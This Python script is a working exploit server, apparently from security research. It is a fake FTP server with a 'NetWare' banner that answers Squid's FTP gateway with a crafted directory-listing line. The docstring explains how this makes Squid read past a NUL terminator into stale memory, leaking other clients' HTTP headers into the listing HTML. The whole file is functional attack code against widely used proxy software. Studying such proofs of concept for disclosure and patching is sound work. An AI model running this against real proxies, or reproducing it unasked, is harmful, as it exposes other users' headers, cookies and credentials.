#!/usr/bin/env python3
"""
Attacker's FTP server (F17 trigger) — HOST-SIDE version.

Squid runs in a container and reaches us via `host.docker.internal`. EPSV
returns only a port number (the FTP client then reuses the control
connection's remote IP for the data channel), so we don't need to encode
our IP in a PASV response — which we couldn't do reliably from behind the
docker bridge anyway. PASV is answered with 500 to force EPSV fallback.

The 220 banner contains "NetWare" so Squid sets flags.skip_whitespace=1,
enabling the while-loop variant of the bug at FtpGateway.cc:627. The data
channel sends a single LIST line with NO filename after the timestamp:

    drwxr-xr-x 1 u g 0 Jan 01 12:34\\r\\n

ftpListParseParts() parses tokens up to "12:34", computes
copyFrom = buf + tokens[7].pos + strlen("12:34") which points at the line's
NUL terminator. strchr(w_space, '\\0') returns non-NULL, so ++copyFrom walks
past the NUL into stale MEM_4K_BUF pool memory. xstrdup(copyFrom) reads
recycled bytes — including other clients' HTTP headers — and they end up
rfc1738-escaped in the directory-listing HTML.
"""
import socket, threading, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 2222
TRIGGER = b"drwxr-xr-x 1 u g 0 Jan 01 12:34\r\n"

def handle(c):
    try:
        c.sendall(b"220 NetWare evil server ready\r\n")
        dl = None
        while True:
            line = b""
            while not line.endswith(b"\n"):
                d = c.recv(1)
                if not d:
                    return
                line += d
            u = line.strip().upper()
            if   u.startswith(b"USER"): c.sendall(b"331 password please\r\n")
            elif u.startswith(b"PASS"): c.sendall(b"230 logged in\r\n")
            elif u.startswith(b"SYST"): c.sendall(b"215 UNIX Type: L8\r\n")
            elif u.startswith(b"PWD"):  c.sendall(b'257 "/"\r\n')
            elif u.startswith(b"TYPE"): c.sendall(b"200 ok\r\n")
            elif u.startswith(b"MDTM"): c.sendall(b"550 no\r\n")
            elif u.startswith(b"SIZE"): c.sendall(b"550 no\r\n")
            elif u.startswith(b"CWD"):  c.sendall(b"250 ok\r\n")
            elif u.startswith(b"EPSV"):
                dl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                dl.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                dl.bind(('0.0.0.0', 0)); dl.listen(1)
                p = dl.getsockname()[1]
                c.sendall(f"229 (|||{p}|)\r\n".encode())
            elif u.startswith(b"PASV"):
                # We can't encode the correct from-container IP reliably,
                # so force Squid to fall back to EPSV.
                c.sendall(b"500 PASV disabled, use EPSV\r\n")
            elif u.startswith(b"LIST") or u.startswith(b"NLST"):
                if dl is None:
                    c.sendall(b"425 use EPSV first\r\n")
                    continue
                c.sendall(b"150 opening\r\n")
                dc, _ = dl.accept()
                dc.sendall(TRIGGER)
                dc.close(); dl.close(); dl = None
                time.sleep(0.05)
                c.sendall(b"226 transfer complete\r\n")
            elif u.startswith(b"QUIT"):
                c.sendall(b"221 bye\r\n"); return
            else:
                c.sendall(b"500 unknown\r\n")
    except Exception:
        pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT)); s.listen(8)
print(f"[evil-ftp] listening on 0.0.0.0:{PORT}", file=sys.stderr, flush=True)
while True:
    cn, _ = s.accept()
    threading.Thread(target=handle, args=(cn,), daemon=True).start()
